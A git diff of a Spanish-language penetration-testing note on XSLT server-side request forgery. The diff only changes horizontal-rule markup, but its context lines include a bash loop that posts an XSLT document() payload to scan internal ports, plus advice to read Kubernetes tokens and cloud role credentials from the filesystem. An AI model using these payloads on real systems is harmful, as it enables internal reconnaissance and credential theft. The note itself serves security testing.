@@ -18,7 +18,7 @@ linked:
 ---
 # XSLT - SSRF
 
-***
+---
 
 ## Escaneo de Puertos Internos
 
@@ -39,7 +39,7 @@ linked:
 | `for p in 22 80 443 3306 5432 6379 8080 8443 9200 27017; do echo "[$p]"; curl -sX POST --data "<xsl:copy-of select=\"document('http://127.0.0.1:$p/')\"/>" https://target/transform \| head -1; done` | Bulk port scan loop | Bulk loop. |
 ^xslt-ssrf-portscan
 
-___
+---
 
 ## Cloud Metadata e Internos
 
@@ -70,4 +70,4 @@ XSLT `document()` y `unparsed-text()` **no permiten setear headers HTTP custom**
 
 Workaround: leer credenciales/tokens desde filesystem (kube SA token, instance role files) y usarlos via OOB chain o reportar como findings.
 
-***
+---
